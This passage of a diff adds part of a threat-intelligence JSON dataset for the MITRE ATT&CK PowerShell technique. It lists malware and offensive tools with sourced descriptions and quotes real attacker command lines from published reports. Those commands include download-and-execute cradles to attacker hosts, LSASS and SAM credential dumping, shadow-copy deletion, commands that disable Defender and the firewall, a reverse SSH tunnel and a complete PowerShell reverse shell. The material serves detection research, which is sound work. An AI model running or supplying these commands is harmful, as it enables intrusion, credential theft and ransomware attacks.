+      {
+        "name": "TrickBot",
+        "attack_id": "S0266",
+        "evidence": "uses T1059.001",
+        "description": "TrickBot has been known to use PowerShell to download new payloads, open documents, and upload data to command and control servers.",
+        "sources": "Bitdefender Trickbot VNC module Whitepaper 2021 https://www.bitdefender.com/files/News/CaseStudies/study/399/Bitdefender-PR-Whitepaper-Trickbot-creat5515-en-EN.pdf"
+      },
+      {
+        "name": "Troll Stealer",
+        "attack_id": "S1196",
+        "evidence": "uses T1059.001",
+        "description": "Troll Stealer creates and executes a PowerShell script to delete itself.",
+        "sources": "S2W Troll Stealer 2024 https://medium.com/s2wblog/kimsuky-disguised-as-a-korean-company-signed-with-a-valid-certificate-to-distribute-troll-stealer-cfa5d54314e2"
+      },
+      {
+        "name": "Tsundere Botnet",
+        "attack_id": "S9034",
+        "evidence": "uses T1059.001",
+        "description": "Tsundere Botnet has been distributed via a PowerShell script.",
+        "sources": "CAL_MuddyWater_Mar2026 https://ctrlaltintel.com/research/MuddyWater/; SecureListUbiedo_Tsundere_Nov2025 https://securelist.com/tsundere-node-js-botnet-uses-ethereum-blockchain/117979/"
+      },
+      {
+        "name": "Ursnif",
+        "attack_id": "S0386",
+        "evidence": "uses T1059.001",
+        "description": "Ursnif droppers have used PowerShell in download cradles to download and execute the malware's full executable payload.",
+        "sources": "Bromium Ursnif Mar 2017 https://www.bromium.com/how-ursnif-evades-detection/"
+      },
+      {
+        "name": "Valak",
+        "attack_id": "S0476",
+        "evidence": "uses T1059.001",
+        "description": "Valak has used PowerShell to download additional modules.",
+        "sources": "Cybereason Valak May 2020 https://www.cybereason.com/blog/valak-more-than-meets-the-eye"
+      },
+      {
+        "name": "Vidar",
+        "attack_id": "S9050",
+        "evidence": "uses T1059.001",
+        "description": "Vidar has used PowerShell commands to modify Windows Defender’s list of excluded file extensions.",
+        "sources": "Logpoint_StealerMalwareFamilies_2024 https://web.archive.org/web/20240517205011/https://www.logpoint.com/wp-content/uploads/2024/03/logpoint-etpr-a-comprehensive-overview-on-stealer-malware-families-1.pdf"
+      },
+      {
+        "name": "WarzoneRAT",
+        "attack_id": "S0670",
+        "evidence": "uses T1059.001",
+        "description": "WarzoneRAT can use PowerShell to download files and execute commands.",
+        "sources": "Check Point Warzone Feb 2020 https://research.checkpoint.com/2020/warzone-behind-the-enemy-lines/; Uptycs Warzone UAC Bypass November 2020 https://www.uptycs.com/blog/warzone-rat-comes-with-uac-bypass-technique"
+      },
+      {
+        "name": "WellMess",
+        "attack_id": "S0514",
+        "evidence": "uses T1059.001",
+        "description": "WellMess can execute PowerShell scripts received from C2.",
+        "sources": "PWC WellMess July 2020 https://www.pwc.co.uk/issues/cyber-security-services/insights/cleaning-up-after-wellmess.html; CISA WellMess July 2020 https://us-cert.cisa.gov/ncas/analysis-reports/ar20-198b"
+      },
+      {
+        "name": "WhisperGate",
+        "attack_id": "S0689",
+        "evidence": "uses T1059.001",
+        "description": "WhisperGate can use PowerShell to support multiple actions including execution and defense evasion.",
+        "sources": "Cisco Ukraine Wipers January 2022 https://blog.talosintelligence.com/2022/01/ukraine-campaign-delivers-defacement.html; Unit 42 WhisperGate January 2022 https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/#whispergate-malware-family; Medium S2W WhisperGate January 2022 https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3"
+      },
+      {
+        "name": "Woody RAT",
+        "attack_id": "S1065",
+        "evidence": "uses T1059.001",
+        "description": "Woody RAT can execute PowerShell commands and scripts with the use of.NET DLL, `WoodyPowerSession`.",
+        "sources": "MalwareBytes WoodyRAT Aug 2022 https://www.malwarebytes.com/blog/threat-intelligence/2022/08/woody-rat-a-new-feature-rich-malware-spotted-in-the-wild"
+      },
+      {
+        "name": "Xbash",
+        "attack_id": "S0341",
+        "evidence": "uses T1059.001",
+        "description": "Xbash can use scripts to invoke PowerShell to download a malicious PE executable or PE DLL for execution.",
+        "sources": "Unit42 Xbash Sept 2018 https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/"
+      },
+      {
+        "name": "ZeroCleare",
+        "attack_id": "S1151",
+        "evidence": "uses T1059.001",
+        "description": "ZeroCleare can use a malicious PowerShell script to bypass Windows controls.",
+        "sources": "IBM ZeroCleare Wiper December 2019 https://web.archive.org/web/20200211083637/https://securityintelligence.com/posts/new-destructive-wiper-zerocleare-targets-energy-sector-in-the-middle-east/"
+      },
+      {
+        "name": "Zeus Panda",
+        "attack_id": "S0330",
+        "evidence": "uses T1059.001",
+        "description": "Zeus Panda uses PowerShell to download and execute the payload.",
+        "sources": "Talos Zeus Panda Nov 2017 https://blog.talosintelligence.com/2017/11/zeus-panda-campaign.html#More"
+      }
+    ],
+    "associated_tools": [
+      {
+        "name": "AADInternals",
+        "attack_id": "S0677",
+        "evidence": "uses T1059.001",
+        "description": "AADInternals is written and executed via PowerShell.",
+        "sources": "AADInternals Documentation https://o365blog.com/aadinternals"
+      },
+      {
+        "name": "BloodHound",
+        "attack_id": "S0521",
+        "evidence": "uses T1059.001",
+        "description": "BloodHound can use PowerShell to pull Active Directory information from the target environment.",
+        "sources": "CrowdStrike BloodHound April 2018 https://www.crowdstrike.com/blog/hidden-administrative-accounts-bloodhound-to-the-rescue/"
+      },
+      {
+        "name": "ConnectWise",
+        "attack_id": "S0591",
+        "evidence": "uses T1059.001",
+        "description": "ConnectWise can be used to execute PowerShell commands on target machines.",
+        "sources": "Anomali Static Kitten February 2021 https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies"
+      },
+      {
+        "name": "Covenant",
+        "attack_id": "S1155",
+        "evidence": "uses T1059.001",
+        "description": "Covenant can create PowerShell-based launchers for Grunt installation.",
+        "sources": "Github Covenant https://github.com/cobbr/Covenant"
+      },
+      {
+        "name": "CrackMapExec",
+        "attack_id": "S0488",
+        "evidence": "uses T1059.001",
+        "description": "CrackMapExec can execute PowerShell commands via WMI.",
+        "sources": "CME Github September 2018 https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference"
+      },
+      {
+        "name": "Donut",
+        "attack_id": "S0695",
+        "evidence": "uses T1059.001",
+        "description": "Donut can generate shellcode outputs that execute via PowerShell.",
+        "sources": "Donut Github https://github.com/TheWover/donut"
+      },
+      {
+        "name": "Empire",
+        "attack_id": "S0363",
+        "evidence": "uses T1059.001",
+        "description": "Empire leverages PowerShell for the majority of its client-side agent tasks. Empire also contains the ability to conduct PowerShell remoting with the Invoke-PSRemoting module.",
+        "sources": "Github PowerShell Empire https://github.com/PowerShellEmpire/Empire; NCSC Joint Report Public Tools https://www.ncsc.gov.uk/report/joint-report-on-publicly-available-hacking-tools"
+      },
+      {
+        "name": "Koadic",
+        "attack_id": "S0250",
+        "evidence": "uses T1059.001",
+        "description": "Koadic has used PowerShell to establish persistence.",
+        "sources": "MalwareBytes LazyScripter Feb 2021 https://web.archive.org/web/20211003035156/https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf"
+      },
+      {
+        "name": "PowerSploit",
+        "attack_id": "S0194",
+        "evidence": "uses T1059.001",
+        "description": "PowerSploit modules are written in and executed via PowerShell.",
+        "sources": "GitHub PowerSploit May 2012 https://github.com/PowerShellMafia/PowerSploit; PowerSploit Documentation http://powersploit.readthedocs.io"
+      },
+      {
+        "name": "Pupy",
+        "attack_id": "S0192",
+        "evidence": "uses T1059.001",
+        "description": "Pupy has a module for loading and executing PowerShell scripts.",
+        "sources": "GitHub Pupy https://github.com/n1nj4sec/pupy"
+      },
+      {
+        "name": "SILENTTRINITY",
+        "attack_id": "S0692",
+        "evidence": "uses T1059.001",
+        "description": "SILENTTRINITY can use PowerShell to execute commands.",
+        "sources": "GitHub SILENTTRINITY Modules July 2019 https://github.com/byt3bl33d3r/SILENTTRINITY/tree/master/silenttrinity/core/teamserver/modules/boo"
+      },
+      {
+        "name": "Sliver",
+        "attack_id": "S0633",
+        "evidence": "uses T1059.001",
+        "description": "Sliver has built-in functionality to launch a Powershell command prompt.",
+        "sources": "Cybereason Sliver Undated https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors"
+      }
+    ],
+    "technique_only": [],
+    "associated_commands": [
+      {
+        "command": "powershell.exe -WindowStyle Hidden -exec bypass -File \"%APPDATA%\\OneDrive.ps1\"",
+        "intent": "Persistence: saved in %APPDATA%\\OneDrive.bat so the DarkHydrus payload script runs hidden each time the user logs on.",
+        "status": "verified",
+        "source_name": "Unit 42 DarkHydrus July 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/"
+      },
+      {
+        "command": "powershell.exe -nop -c [System.Reflection.Assembly]::Load(([WmiClass]'root\\cimv2:Win32_Base64Class').Properties['Prop'].Value);[MSDAC.PerfOSChecker]::StartCheck()",
+        "intent": "Fileless persistence: loads FIN8's .NET payload, stored in a WMI class property, straight into memory; a WMI event runs it after each boot.",
+        "status": "verified",
+        "source_name": "Bitdefender FIN8 July 2021",
+        "source_url": "https://businessinsights.bitdefender.com/deep-dive-into-a-fin8-attack-a-forensic-investigation"
+      },
+      {
+        "command": "powershell.exe -nop -ep bypass -c iex (New-Object System.Net.WebClient).DownloadString('hxxps://37-10-71-215[.]nip[.]io:8443/7ea5fa')",
+        "intent": "Launch the backdoor by downloading a script and running it in memory; the attackers ran it over PsExec.",
+        "status": "verified",
+        "source_name": "Symantec FIN8 Jul 2023",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/syssphinx-fin8-backdoor"
+      },
+      {
+        "command": "\"powershell.exe\" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71[.]182 -P 22 -l forward -pw Socks@123 -no-antispoof",
+        "intent": "Open a reverse SSH tunnel with plink so the Exchange server's RDP port can be reached from the internet.",
+        "status": "verified",
+        "source_name": "DFIR Phosphorus November 2021",
+        "source_url": "https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/"
+      },
+      {
+        "command": "\"powershell.exe\" /c Remove-Item -Path C:\\windows\\temp\\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\windows\\temp\\ssasl.pmd full | out-host; Compress-Archive C:\\windows\\temp\\ssasl.pmd C:\\windows\\temp\\ssasl.zip",
+        "intent": "Credential access: dump LSASS memory with comsvcs.dll MiniDump and zip the dump for exfiltration.",
+        "status": "verified",
+        "source_name": "DFIR Report APT35 ProxyShell March 2022",
+        "source_url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+      },
+      {
+        "command": "powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('hxxp://139.59.46[.]154:3485/eiloShaegae1')\"",
+        "intent": "Download and run more code in memory from the attackers' server, fetched by the Rollover delivery documents.",
+        "status": "verified",
+        "source_name": "Unit 42 Magic Hound Feb 2017",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/"
+      },
+      {
+        "command": "powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\ZIPSDK\\ProjectConfManagerNT.ini))));",
+        "intent": "Decode and run the Base64-encoded PowerShell payload stored in a text file, the last step of the infection chain.",
+        "status": "verified",
+        "source_name": "Securelist MuddyWater Oct 2018",
+        "source_url": "https://securelist.com/muddywater/88059/"
+      },
+      {
+        "command": "cmd /c start /b powershell -c Get-WmiObject -Query {SELECT * FROM Win32_DiskPartition WHERE Bootable = TRUE} >> c:\\users\\public\\d",
+        "intent": "Discovery during lateral movement: list bootable disk partitions and save the output to a file the attackers collect.",
+        "status": "verified",
+        "source_name": "Kaspersky ToddyCat Check Logs October 2023",
+        "source_url": "https://securelist.com/toddycat-keep-calm-and-check-logs/110696/"
+      },
+      {
+        "command": "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc <BASE64>",
+        "intent": "Run the PowerShell Empire loader, stored as an encoded command in a malicious Windows service.",
+        "status": "verified",
+        "source_name": "CrowdStrike Grim Spider May 2019",
+        "source_url": "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/"
+      },
+      {
+        "command": "Powershell -c “Get-ChildItem C:\\ProgramData\\sam.save, C:\\ProgramData\\security.save, C:\\ProgramData\\system.save ^| Compress-Archive -DestinationPath C:\\Program\\Dataout.zip”",
+        "intent": "Credential theft: compress the exported SAM, SECURITY and SYSTEM registry hives into a ZIP file.",
+        "status": "verified",
+        "source_name": "Nearest Neighbor Volexity",
+        "source_url": "https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command “Get-WebServicesVirtualDirectory | Format-List”",
+        "intent": "Reconnaissance on Exchange: list the configured web services virtual directories.",
+        "status": "verified",
+        "source_name": "Volexity SolarWinds",
+        "source_url": "https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/"
+      },
+      {
+        "command": "powershell.exe -windowstyle hidden regsvr32.exe /s AppleSeed_Payload",
+        "intent": "Run the AppleSeed backdoor DLL through regsvr32 from a hidden PowerShell window.",
+        "status": "verified",
+        "source_name": "Malwarebytes Kimsuky June 2021",
+        "source_url": "https://blog.malwarebytes.com/threat-analysis/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/"
+      },
+      {
+        "command": "PowerShell.exe -exec bypass -file C:\\ProgramData\\WindowsAppPool\\AppPool.ps1",
+        "intent": "Run the BONDUPDATER Trojan's PowerShell script dropped by the phishing document's macro.",
+        "status": "verified",
+        "source_name": "Palo Alto OilRig Sep 2018",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/"
+      },
+      {
+        "command": "\"C:\\Windows\\SysWow64\\WindowsPowerShell\\v1.0\\powershell.exe\" -w hidden -ep bypass -nop -Command \"iex ((New-Object System.Net.WebClient).DownloadString('hxxps://h3.errantrefrainundocked[.]shop/riii2.aspx'))\"",
+        "intent": "Download and run the next Lumma Stealer stage in memory after a fake CAPTCHA tricks the user into running it.",
+        "status": "verified",
+        "source_name": "Netskope LummaStealer 2025",
+        "source_url": "https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection"
+      },
+      {
+        "command": "powershell -Command Import-Module ActiveDirectory ; Get-ADComputer -Filter * | Select-Object -ExpandProperty DNSHostName",
+        "intent": "Discovery: list the DNS host names of every computer in Active Directory.",
+        "status": "verified",
+        "source_name": "Cisco Talos Qilin Ransomware OCT 2025",
+        "source_url": "https://blog.talosintelligence.com/uncovering-qilin-attack-methods-exposed-through-multiple-cases/"
+      },
+      {
+        "command": "powershell.exe -Command PowerShell -Command “\\”Get-CimInstance Win32_ShadowCopy | Remove-CimInstance\\””",
+        "intent": "Inhibit recovery: delete all Volume Shadow Copies before encrypting files.",
+        "status": "verified",
+        "source_name": "Group-IB RansomHub FEB 2025",
+        "source_url": "https://www.group-ib.com/blog/ransomhub-never-sleeps-episode-1/"
+      },
+      {
+        "command": "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true; Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled",
+        "intent": "Defense evasion: turn off Defender real-time monitoring and stop and disable the Defender service.",
+        "status": "verified",
+        "source_name": "CarveyODonnellWelchHuntress_TheGentlemen_May2026",
+        "source_url": "https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps"
+      },
+      {
+        "command": "powershell -Command Add-MpPreference -ExclusionPath C:\\ -Force",
+        "intent": "Defense evasion: exclude the whole C: drive from Defender scanning so the ransomware is not detected.",
+        "status": "verified",
+        "source_name": "CarveyODonnellWelchHuntress_TheGentlemen_May2026",
+        "source_url": "https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps"
+      },
+      {
+        "command": "powershell -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False",
+        "intent": "Turn off Windows Firewall on every profile on each reachable host before deploying the ransomware.",
+        "status": "verified",
+        "source_name": "CheckPointResearch_TheGentlemen_April2026",
+        "source_url": "https://research.checkpoint.com/2026/dfir-report-the-gentlemen/"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -file \\\\DOMAINCONTROLLER\\share$\\p.ps1",
+        "intent": "The threat actors used PsExec to execute a PowerShell script that called comsvcs.dll for lsass dumping.",
+        "status": "verified",
+        "source_name": "The DFIR Report PYSA Mespinoza Ransomware November 2020",
+        "source_url": "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/"
+      },
+      {
+        "command": "powershell -ep bypass -c \\\"& {Import-Module c:\\\\sh.ps1; Invoke-BloodHound -CollectionMethod All}\\\" 1>c:\\\\ret.txt",
+        "intent": "The actor used BloodHound and the SharpHound collector to map the trusts between various domains; this is one of two example commands executed through SharpHound.",
+        "status": "verified",
+        "source_name": "Fox-IT Operation Wocao December 2019",
+        "source_url": "https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf"
+      },
+      {
+        "command": "powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA3ADgAMAAxAC8AJwApADsAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA==",
+        "intent": "Defense evasion: the threat actors disabled Windows Defender with an encoded PowerShell command.",
+        "status": "verified",
+        "source_name": "The DFIR Report Ryuk's Return October 2020",
+        "source_url": "https://thedfirreport.com/2020/10/08/ryuks-return/"
+      },
+      {
+        "command": "PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc', '%TEMP%\\\\AAA.exe');Start-Process('%TEMP%\\\\AAA.exe')",
+        "intent": "The DDE exploit in the attached Word document ran this code to download AAA.exe from a remote server and start it.",
+        "status": "verified",
+        "source_name": "Unit 42 Fractured Block CARROTBAT November 2018",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/"
+      },
+      {
+        "command": "powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcAAuAGUAcwB0AG8AbgBpAG4AZQAuAGMAbwBtAC8AcAA/AGUAJwApAA==",
+        "intent": "An attacker was seen executing encoded PowerShell commands that download malware from a remote location after exploiting Exchange.",
+        "status": "verified",
+        "source_name": "Rapid7 Exchange Zero-Day Attacker Behavior March 2021",
+        "source_url": "https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "command": "powershell -nop -exec bypass -c iex(new-object net.webclient).downloadstring('hxxps://raw[.]githubusercontent[.]com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack[.]ps1'); PowerSharpPack -Rubeus -Command \"kerberoast\"",
+        "intent": "UNC2165 downloaded a Kerberoasting utility from GitHub (Figure 3).",
+        "status": "verified",
+        "source_name": "Mandiant UNC2165 Shifts to Evade Sanctions June 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/unc2165-shifts-to-evade-sanctions/"
+      },
+      {
+        "command": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1')\" 1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1",
+        "intent": "The attackers appear to have leveraged a Tomcat exploit to execute a PowerShell command, which was used to download a JPEG file from an internal server.",
+        "status": "verified",
+        "source_name": "Symantec Ukraine Wiper Attacks February 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
+      },
+      {
+        "command": "powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072 2>&1",
+        "intent": "PowerShell was used to dump credentials from the compromised machine before the wiper was deployed.",
+        "status": "verified",
+        "source_name": "Symantec Ukraine Wiper Attacks February 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
+      },
+      {
+        "command": "powershell -command \"(New-Object Net.WebClient).DownloadFile('hxxp://msdl[.]microsoft[.]com/download/symbols/ntkrnlmp[.]pdb/11D60DB07BA7433B923F49867DF515721/ntkrnlmp[.]pdb', 'CSIDL_SYSTEM_DRIVE\\systemdata\\ntkrnlmp.pdb')\"",
+        "intent": "On execution the BlackByte 2.0 payload downloads and saves debugging symbols from Microsoft; the command is executed directly from the ransomware.",
+        "status": "verified",
+        "source_name": "Symantec BlackByte Exbyte Ransomware",
+        "source_url": "https://www.security.com/threat-intelligence/blackbyte-exbyte-ransomware"
+      },
+      {
+        "command": "powershell.exe -noni -nop -w 1 -enc IAAoAEcAZQB0AC0AQQBEAEQAbwBtAGEAaQBuACkALgBQAEQAQwBFAG0AdQBsAGEAdABvAHIA 1> \\Windows\\Temp\\UDaYsR 2>&1",
+        "intent": "The attacker executed encoded PowerShell to identify critical domain infrastructure, with a focus on the Primary Domain Controller (the encoded text is (Get-ADDomain).PDCEmulator).",
+        "status": "verified",
+        "source_name": "TrendAI Unmasking the Gentlemen Ransomware",
+        "source_url": "https://www.trendaisecurity.com/en-us/resources-insights/trendai-security-blog/unmasking-the-gentlemen-ransomware"
+      },
+      {
+        "command": "powershell -NoProfile -Command ;& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$groups = Get-LocalGroup | Select-Object Name, Domain, SID;foreach($g in $groups){-join($g.SID,'|',$g.Name);$members = Get-LocalGroupMember -SID $g.SID | Select *;foreach($m in $members){-join(' ',$m.SID,'|',$m.Name,'|',$m.ObjectClass,'|',$m.PrincipalSource);}}};$r = wjb $j -Timeout 300; rcjb $j;};",
+        "intent": "Another PowerShell script was executed to query and collect information about local user groups and their members on a Windows system.",
+        "status": "verified",
+        "source_name": "Symantec Crambus Middle East Government February 2023",
+        "source_url": "https://www.security.com/threat-intelligence/crambus-middle-east-government"
+      },
+      {
+        "command": "powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30",
+        "intent": "The scheduled task created by Qbot runs every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.",
+        "status": "verified",
+        "source_name": "The DFIR Report Qbot and Zerologon February 2022",
+        "source_url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
+      },
+      {
+        "command": "powershell -ExecutionPolicy Bypass -command \"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force\"",
+        "intent": "To impair the host defenses before dropping the locker payload, Black Basta runs batch scripts that disable Windows Defender with commands like this one.",
+        "status": "verified",
+        "source_name": "SentinelOne Black Basta EDR Evasion Tools",
+        "source_url": "https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/"
+      },
+      {
+        "command": "powershell -W Hidden (New-Object System.NeT.WeBClieNT).DownloadFile('http://lokipanelhostingpanel[.]gq/work/kh/1.exe','%Public%\\\\\\\\svchost32.exe');Start-Process '%Public%\\\\\\\\svchost32.exe",
+        "intent": "The macro in the delivery document downloads an executable from a remote server by running this command line.",
+        "status": "verified",
+        "source_name": "Unit 42 Gorgon Group August 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/08/unit42-gorgon-group-slithering-nation-state-cybercrime/"
+      },
+      {
+        "command": "powershell -exec bypass -c \"Invoke-WebRequest -Uri hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll -OutFile C:\\Windows\\System32\\AclNumsInvertHost.dll\"",
+        "intent": "The actor downloaded the DLL AclNumsInvertHost.dll onto the TeamCity host using PowerShell and the Invoke-WebRequest cmdlet.",
+        "status": "verified",
+        "source_name": "Fortinet TeamCity Intrusion Saga APT29",
+        "source_url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793"
+      },
+      {
+        "command": "powershell -w h -c \"iwr -UseBasicParsing https[:]//teams[.]onweblive[.]org/api/update/8555575039/4|iex\"",
+        "intent": "Through the Node.js implant shell runner, Sapphire Sleet downloads and executes a PowerShell backdoor script from a separate attacker-controlled domain.",
+        "status": "verified",
+        "source_name": "Microsoft Mastra npm Postinstall Payload June 2026",
+        "source_url": "https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise/"
+      },
+      {
+        "command": "powershell -c \"iwr -Uri http://preston[.]melaniebest[.]com/ms/curl.tmp -OutFile C:\\Windows\\System32\\curl.exe -UseBasicParsing\" ^> \\\\127.0.0.1\\C$\\dvPqyh 2^>^&1 > %TEMP%\\KzIMnc.bat & %COMSPEC% /Q /c %TEMP%\\KzIMnc.bat & %COMSPEC% /Q /c del %TEMP%\\KzIMnc.bat",
+        "intent": "The initial command uses PowerShell to download curl.tmp and save it as curl.exe in C:\\Windows\\System32.",
+        "status": "verified",
+        "source_name": "Trend Micro Earth Kapre RedCurl 2024",
+        "source_url": "https://www.trendmicro.com/en_us/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html"
+      },
+      {
+        "command": "powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\"",
+        "intent": "Upon execution, the Windows variant of the Akira encryptor attempts to delete shadow copies using this PowerShell command.",
+        "status": "verified",
+        "source_name": "Unit 42 Akira Ransomware Threat Assessment December 2024",
+        "source_url": "https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/"
+      },
+      {
+        "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{redacted}', 80);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
+        "intent": "APT41 used PowerShell, executed in stealth mode, to obtain a reverse shell that lets the group run remote commands through its C&C server.",
+        "status": "verified",
+        "source_name": "Group-IB APT41 World Tour 2021",
+        "source_url": "https://www.group-ib.com/blog/apt41-world-tour-2021/"
+      },
+      {
